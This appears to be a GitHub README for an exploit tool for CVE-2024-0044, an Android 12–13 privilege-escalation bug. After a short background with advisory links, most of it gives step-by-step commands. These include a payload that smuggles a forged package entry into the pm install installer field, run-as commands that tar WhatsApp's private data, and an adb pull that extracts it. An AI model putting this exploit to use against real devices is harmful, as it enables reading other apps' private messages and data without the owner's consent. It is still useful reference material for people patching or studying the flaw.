## CVE 2024 0044
CVE-2024-0044, identified in the createSessionInternal function of the PackageInstallerService.java file, is a high-severity vulnerability affecting Android versions 12 and 13. This vulnerability allows an attacker to perform a "run-as any app" attack, leading to local escalation of privilege without requiring user interaction.The issue arises due to improper input validation within the createSessionInternal function. An attacker can exploit this by manipulating the session creation process, potentially gaining unauthorized access to sensitive data and performing unauthorized actions on the affected device​ 

The exploit was discovered by [Meta security ](https://rtx.meta.security/exploitation/2024/03/04/Android-run-as-forgery.html)

The proof of concept was summarised and shared by [Tiny hack](https://tinyhack.com/2024/06/07/extracting-whatsapp-database-or-any-app-data-from-android-12-13-using-cve-2024-0044/?s=03)

Details about the security patch can be found at [Android security bulletin](https://source.android.com/docs/security/bulletin/2024-03-01)

## Prerequisites
1. Enable USB debugging in your mobile phone and connect it to your machine using a usb cable or wireless debugging
2. Download any apk to your machine you can use [F-DROID](https://f-droid.org/)

## How to use the tool 
```
python3 cve_2024_0044.py -h
                                                                               
.                   .:.                                         .::.                     .
.                 :++++=:                                     :=+++++                    .
.                 -**++++-                                   :++++**+                    .
.                  =**++++=                                 -++++**+                     .
.                   -**++++=.                              =++++**=                      .
.                    :**++++=.    ..::-----------:::.     =++++**=                       .
.                     .**++++=--====---------------====--=++++**-                        .
.                      .*++====-------------------------====++*:                         .
.                     :======-----------------------------======:                        .
.                  .-======------=====================------======-.                     .
.                .=+===============================================+=:                   .
.              .=+++===============================================+++=.                 .
.             -++++=================================================++++-                .
.            =++++++===*#%@@%+++++++++++++++++++++++++++++#@@@#*===+++++++.              .
.          .++++++++++#@%@@@@#+++++++++++++++++++++++++++*@@@@%@%++++++++++.             .
.         .+**++++++++@@@@@@@*+++++++++++++++++++++++++++*@%@@@@@++++++++**+.            .
.         +****+++++++*@@@@#*+++++++++++++++++++++++++++++*#@@@@#+++++++****+            .
.        =******+++++++++++++++++++++++++++++++++++++++++++++++++++++++******=           .
.       .********+++++++++++++++++++++++++++++++++++++++++++++++++++++********:          .
.       =*********+++++++++++++++++++++++++++++++++++++++++++++++++++*********+        
          
usage: cve_2024_0044.py [-h] -P P -A A

CVE-2024-0044: run-as any app @Pl4int3xt

options:
  -h, --help  show this help message and exit
  -P P        package name (default: None)
  -A A        apk file path (default: None)
```
``-P`` is used to specify the target package name you want to run as 

``-A`` to specify the apk file to push in the device
## Exploitation
Run the tool
```python3 cve_2024_0044.py -P com.whatsapp -A /home/pl4int3xt/Downloads/F-Droid.apk```

A ```payload.txt``` file like this will be generated
```
PAYLOAD="@null
victim 10289 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"
pm install -i "$PAYLOAD" /data/local/tmp/F-Droid.apk
```
### Next you'll need to connect to your device using adb shell and paste in the payload and make sure you get a ``Success`` message back after the last command
```
pl4int3xt ~>  adb shell
pixel:/ $ PAYLOAD="@null
> victim 10289 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null"
pixel:/ $ pm install -i "$PAYLOAD" /data/local/tmp/F-Droid.apk
Success
```

### Next we get the whatsapp data using the following commands
```
pixel:/ $ mkdir /data/local/tmp/wa/                                                                            
pixel:/ $ touch /data/local/tmp/wa/wa.tar
pixel:/ $ chmod -R 0777 /data/local/tmp/wa/
pixel:/ $ run-as victim
pixel:/data/user/0 $ tar -cf /data/local/tmp/wa/wa.tar com.whatsapp
```
Create a temporary directory: `mkdir /data/local/tmp/wa/`

Create a placeholder for a tar file: `touch /data/local/tmp/wa/wa.tar`

Set wide-open permissions: `chmod -R 0777 /data/local/tmp/wa/` to ensure any user can read, write, and execute within this directory.

Switch user context: `run-as victim` to gain the same permissions as the "victim" user.

Archive the target application's data: `tar -cf /data/local/tmp/wa/wa.tar com.whatsapp`, creating a tarball of the WhatsApp data directory.

### Finally pull the data
```adb pull /data/local/tmp/wa/wa.tar```

You can extract the data using `7z` or any other tool

You can use [Whatsapp chat exporter](https://github.com/KnugiHK/Whatsapp-Chat-Exporter) to convert it to HTML

This allows you to get whatsapp data without a root access on your device




 
